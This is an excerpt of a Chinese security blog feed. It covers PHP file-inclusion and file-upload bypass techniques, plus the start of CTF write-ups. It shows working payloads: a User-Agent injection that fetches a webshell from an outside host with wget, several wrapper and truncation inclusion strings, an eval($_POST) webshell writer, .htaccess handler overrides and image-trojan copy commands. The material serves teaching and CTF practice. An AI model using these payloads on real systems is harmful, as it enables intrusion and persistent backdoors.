title="包含/proc/self/environ文件"></a>包含/proc/self/environ文件</h3><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>姿势：</p><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>?file=../../../../../../../proc/self/environ</p><p>选择User-Agent 写代码如下：</p><pre><code>&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;</code></pre><p>然后提交请求。</p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140916_975.png" alt=""></p><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p><h2 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h2><p>审计中可见这样的包含模版文件：</p><pre><code class="php">&lt;?php    $file = $_GET[&#39;file&#39;];    include &#39;/var/www/html/&#39;.$file.&#39;/test/test.php&#39;;?&gt;</code></pre><p>这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。</p><ol><li><p>%00截断</p><p>能利用00截断的场景现在应该很少了</p><p>PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p><p>?file=../../../../../../../../../etc/passwd%00<br>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p></li><li><p>%00截断目录遍历：</p><p>?file=../../../../../../../../../var/www/%00<br>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p></li><li><p>路径长度截断：</p><p>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br>(php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</p><p>利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p><p>我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br>而利用”./“的方式即可构造出超长目录字符串:</p></li><li><p>点号截断：</p><p>?file=../../../../../../../../../boot.ini/………[…]…………<br>(php版本小于5.2.8可以成功，只适用windows，点号需要长于256)</p></li><li><p>编码绕过</p><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li>利用url编码<ul><li>../<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/  </li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul></li><li>二次编码<ul><li>../<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul></li></ul></li></ol><h2 id="二、远程文件包含"><a href="#二、远程文件包含" class="headerlink" title="二、远程文件包含"></a>二、远程文件包含</h2><pre><code>?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp</code></pre><h2 id="有防御的远程文件包含"><a href="#有防御的远程文件包含" class="headerlink" title="有防御的远程文件包含"></a>有防御的远程文件包含</h2><pre><code class="php">&lt;?php     $basePath = $_GET[&#39;path&#39;];    require_once $basePath . &quot;/action/m_share.php&quot;;  ?&gt;</code></pre><p>攻击者可以构造类似如下的攻击URL</p><pre><code class="url">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23</code></pre><p>产生的原理:</p><pre><code>/?path=http://localhost/test/solution.php?最终目标应用程序代码实际上执行了:require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合</code></pre><h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h2><p><a href="http://cn2.php.net/manual/zh/wrappers.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/wrappers.php</a></p><pre><code>file:///var/www/html  访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLsdata://  数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流</code></pre><h3 id="利用php流input："><a href="#利用php流input：" class="headerlink" title="利用php流input："></a>利用php流input：</h3><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032124_161.png" alt=""></p><p>结果将在index.php所在文件下的文件shell.php内增加”&lt;?php phpinfo();?&gt;”一句话</p><h3 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h3><p>?file=php://filter/convert.base64-encode/resource=index.php</p><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p>其他姿势：</p><pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p><h3 id="利用data-URIs："><a href="#利用data-URIs：" class="headerlink" title="利用data URIs："></a>利用data URIs：</h3><p>利用条件：</p><ol><li>php版本大于等于php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p><pre><code>?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,base64编码的payloadindex.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;</code></pre><p>(需要allow_url_include=On)</p><h3 id="利用XSS执行任意代码："><a href="#利用XSS执行任意代码：" class="headerlink" title="利用XSS执行任意代码："></a>利用XSS执行任意代码：</h3><p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="external">http://127.0.0.1/path/xss.php?xss=phpcode</a></p><p>利用条件：</p><ol><li>allow_url_fopen = On</li><li>并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊</li></ol><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// 查找匹配的文件路径模式</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><p>姿势：</p><p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="http://oy0tigw51.bkt.clouddn.com/201805140917_301.png" alt=""></p><p>指定绝对路径</p><pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></pre><p>或者使用相对路径（这里test.zip就在当前目录下）</p><pre><code>index.php?file=phar://test.zip/phpinfo.txt</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140917_297.png" alt=""></p><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><pre><code>&lt;?php$file = $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){    include($file);}?&gt;</code></pre><p>截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含</p><p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p><p>然后我们构造zip://php.zip#php.jpg</p><pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg</code></pre><p>注意事项：</p><ol><li>若是使用相对路径，则会包含失败。</li><li>协议原型：zip://archive.zip#dir/file.txt</li><li>注意url编码,因为这个#会和url协议中的#冲突</li></ol><h2 id="CTF中的文件包含套路"><a href="#CTF中的文件包含套路" class="headerlink" title="CTF中的文件包含套路"></a>CTF中的文件包含套路</h2><h3 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h3><p>点击login，发现链接变为：</p><pre><code>http://54.222.188.152:1/index.php?action=login.php</code></pre><p>推测文件包含 访问：</p><pre><code>http://54.222.188.152:1/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</code></pre><p>得到源码</p><h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>iscc2018的一道题目</p><p>打开题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140857_654.png" alt=""></p><p>查看源码<img src="http://oy0tigw51.bkt.clouddn.com/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>要求：</p><ul><li>php版本小于5.3.4</li><li>magic_quotes_gpc为off状态</li></ul><p>大多数的文件包含漏洞都是需要截断的，因为正常程序里面包含的文件代码一般是include(BASEPATH.$mod.’.php’)或者include($mod.’.php’)这样的方式，如果我们不能写入.php为扩展名的文件，那我们是需要截断来利用的</p><p>受限与gpc和addslashes等函数的过滤，另外，php5.3之后的版本全面修复了%00截断的问题</p><pre><code class="php">&lt;?phpinclude($_GET[&#39;a&#39;].&#39;.php&#39;)?&gt;</code></pre><p>上传我们的2.txt文件,请求<a href="http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码" target="_blank" rel="external">http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码</a> </p><p>列子二</p><p>漏洞文件index.php</p><pre><code>&lt;?phpif (empty($_GET[&quot;file&quot;])){    echo(&#39;../flag.php&#39;);    return;}else{    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;    include $filename;}?&gt;</code></pre><p>flag文件放在上层目录</p><p>这里限制了后缀名，我们需要通过截断才能访问到flag文件 利用代码：</p><pre><code>index.php?file=../../flag.php%00</code></pre><p>%00 会被解析为0x00，所以导致截断的发生 我们通过截断成功的绕过了后缀限制</p><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>我们现在已经知道使用%00截断有两个条件php版本小于5.3.4和magic_quotes_gpc为off状态。 如果这时我们将magic_quotes_gpc改为on那么就不能截断了，因为开启magic_quotes_gpc后%00会被加上一个反斜杠转义掉</p><p><img src="https://pic3.zhimg.com/80/v2-4ae67b246f19f5fe0d2355c77021bfef_hd.jpg" alt="img"></p><p>那么我们这时候有没有办法绕过这个限制呢？有一个条件那就是php版本小于5.3.10 我们的代码依旧不变 漏洞文件index.php</p><pre><code>&lt;?phpif (empty($_GET[&quot;file&quot;])){    echo(&#39;../flag.php&#39;);    return;}else{    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;    include $filename;}?&gt;</code></pre><p>flag文件放在上层目录 这时我们可以使用字符 .    /.   和  ./  来进行绕过，因为文件路径有长度限制</p><ul><li>windows 259个bytes</li><li>linux 4096个bytes</li></ul><p>在windows下需要.字符最少的利用POC1：</p><pre><code>file=../../flag.php..............................................................................................................................................................................................................................................</code></pre><p><img src="https://pic2.zhimg.com/80/v2-727b4d978c8ed0f1676673c26851761d_hd.jpg" alt="img"></p><p>在windows下需要.字符最少的利用POC2：</p><pre><code>file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="https://pic1.zhimg.com/80/v2-9ca3a3374552ee9db6dc65c999b21a3a_hd.jpg" alt="img"></p><p>将flag.php改为flag1.php 在windows下需要.字符最少的利用POC3：</p><pre><code>file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="https://pic4.zhimg.com/80/v2-a9471dd64354a01407e18a5a1cccb2b9_hd.jpg" alt="img"></p><p>我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3</p><p>Refer：<a href="https://zhuanlan.zhihu.com/p/27739315" target="_blank" rel="external">腹黑师傅</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php文件包含漏洞&quot;&gt;&lt;a href=&quot;#php文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;php文件包含漏洞&quot;&gt;&lt;/a&gt;php文件包含漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="Web安全" scheme="http://0xmj.club/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件包含" scheme="http://0xmj.club/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传总结</title>
    <link href="http://0xmj.club/2018/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://0xmj.club/2018/04/23/文件上传总结/</id>
    <published>2018-04-23T13:39:03.000Z</published>
    <updated>2018-04-23T14:06:21.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a>文件上传总结</h1><h2 id="0x00-上传检测流程概述"><a href="#0x00-上传检测流程概述" class="headerlink" title="0x00 上传检测流程概述"></a>0x00 上传检测流程概述</h2><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据而一般文件上传过程中检测部分由</p><ul><li>A 客户端javascript检测 （检测文件扩展名）</li><li>B 服务端MIME类型检测 （检测Content—Type）</li><li>C 服务端目录路径检测（检测和path相关参数）</li><li>D 服务端文件扩展名检测 （检测文件扩展名）</li><li>E 服务端内容检测 （检测是否含有恶意代码）0x01 客户端检测绕过(javascript 检测)</li></ul><h2 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h2><h2 id="0x02-服务端检测绕过-MIME-类型检测"><a href="#0x02-服务端检测绕过-MIME-类型检测" class="headerlink" title="0x02 服务端检测绕过(MIME 类型检测)"></a>0x02 服务端检测绕过(MIME 类型检测)</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804071824_866.png" alt=""></p><h2 id="0x03-服务端检测绕过-目录路径检测"><a href="#0x03-服务端检测绕过-目录路径检测" class="headerlink" title="0x03 服务端检测绕过(目录路径检测)"></a>0x03 服务端检测绕过(目录路径检测)</h2><h2 id="0x04-服务端检测绕过-文件扩展名检测"><a href="#0x04-服务端检测绕过-文件扩展名检测" class="headerlink" title="0x04 服务端检测绕过(文件扩展名检测)"></a>0x04 服务端检测绕过(文件扩展名检测)</h2><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br>用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br>在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br>被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过<br>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg<br>​</p></li><li><p>.htaccess 文件攻击<br>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code>&lt;FilesMatch &quot;_php.gif&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h2 id="0x05-服务端检测绕过-文件内容检测"><a href="#0x05-服务端检测绕过-文件内容检测" class="headerlink" title="0x05 服务端检测绕过(文件内容检测)"></a>0x05 服务端检测绕过(文件内容检测)</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>GIF ： 47 49 46 38 39 61 (GIF89a)<br>PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>绕过方法：<br>针对渲染加载测试：代码注入绕过<br>针对二次渲染测试：攻击文件加载器</p></li></ul><h2 id="0x06-服务器解析漏洞"><a href="#0x06-服务器解析漏洞" class="headerlink" title="0x06 服务器解析漏洞"></a>0x06 服务器解析漏洞</h2><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：</p><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li></ul><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p>将shell语句，如</p><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code>xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>nginx 0.5.* [Success]</p><p>nginx 0.6.* [Success]</p><p>nginx 0.7 &lt;= 0.7.65 [Success]</p><p>nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h2 id="0x07-上传攻击框架"><a href="#0x07-上传攻击框架" class="headerlink" title="0x07 上传攻击框架"></a>0x07 上传攻击框架</h2><ul><li>轻量级检测绕过攻击</li><li>路径/扩展名检测绕过攻击</li><li>文件内容性检测绕过攻击</li><li>上传攻击框架</li></ul><h2 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h2><p>1.关掉上传文件的功能</p><p>如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。<br>2.限制能够上传的文件大小<br>如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。<br>3.检查上传文件的类型<br>4.检查上传文件的内容<br>5.上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性。</p><h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><p>命令：</p><pre><code>copy /b 1.jpg+2.php</code></pre><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传总结&quot;&gt;&lt;a href=&quot;#文件上传总结&quot; class=&quot;headerlink&quot; title=&quot;文件上传总结&quot;&gt;&lt;/a&gt;文件上传总结&lt;/h1&gt;&lt;h2 id=&quot;0x00-上传检测流程概述&quot;&gt;&lt;a href=&quot;#0x00-上传检测流程概述&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Web安全" scheme="http://0xmj.club/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://0xmj.club/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF三道小结</title>
    <link href="http://0xmj.club/2018/04/23/DDCTF%E4%B8%89%E9%81%93%E5%B0%8F%E7%BB%93/"/>
    <id>http://0xmj.club/2018/04/23/DDCTF三道小结/</id>
    <published>2018-04-23T13:35:39.000Z</published>
    <updated>2018-04-23T13:36:28.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF三道小结"><a href="#DDCTF三道小结" class="headerlink" title="DDCTF三道小结"></a>DDCTF三道小结</h1><p>太菜了 就只能做出三道题，继续加油，明年再战</p><h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd</p><p>进制转换，先将16进制转换为10进制，再对128求余，剩下的结果转换为字符。</p><pre><code class="python">ascii=&quot;212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253&quot;newlist=ascii.split()newlist2=ascii.split()for i in range(90,160):    for j in range(len(newlist)):        newlist2[j]=int(newlist[j])-i    for k in newlist2:        print chr(int(k)),    print &quot;&quot;</code></pre><p>​    </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192226_410.png" alt=""></p><p> DDCTF{922ab9974a47cd322cf43b50610faea5}</p><h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192234_752.png" alt=""></p><p>分析得到有一个压缩包</p><p>foremost出来得到zip，</p><p>解压密码在windows.jpg属性的备注</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192236_14.png" alt=""></p><p>Pactera</p><p>（插曲我一开始以为是crc32攻击）逃 </p><p>解压得到file</p><p>根据提示进行字符频度统计即可得到flag。</p><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx" target="_blank" rel="external">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><table><thead><tr><th>词</th><th>频次</th><th>频率 